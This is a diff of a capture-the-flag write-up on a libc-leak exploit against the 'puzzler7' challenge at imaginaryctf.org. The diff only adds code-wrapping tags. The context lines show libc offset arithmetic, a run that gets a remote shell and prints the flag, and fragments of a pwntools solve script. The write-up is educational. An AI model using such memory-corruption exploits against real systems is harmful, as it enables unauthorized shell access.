@@ -40,13 +40,16 @@ We'll get a list of possible Lib-C library versions. The more functions we leak,
 
 In this case, the correct version was `libc6_2.35-0ubuntu3_amd64`, so we plug in the correct offsets.
 
+{% code overflow="wrap" %}
 ```py
 libc = puts - 0x80ed0
 system = libc + 0x50d60
 ```
+{% endcode %}
 
 Running the binary, we get a shell.
 
+{% code overflow="wrap" %}
 ```py
 python exploit.py REMOTE puzzler7.imaginaryctf.org 2998
 [+] Opening connection to puzzler7.imaginaryctf.org on port 2998: Done
@@ -58,11 +61,13 @@ python exploit.py REMOTE puzzler7.imaginaryctf.org 2998
 >>> $ cat flag.txt
 ictf{dammit_I'm_never_gonna_mix_up_64_and_0x64_again_it's_cost_me_three_flags_already}
 ```
+{% endcode %}
 
 **note:** If this write-up didn't make much sense, review `Links 1` and `Links 2` write-ups first 🙂
 
 ## Solve Script
 
+{% code overflow="wrap" %}
 ```py
 from pwn import *
 
@@ -140,3 +145,4 @@ io.sendlineafter(b'>>>', b'1')
 # Got Shell?
 io.interactive()
 ```
+{% endcode %}
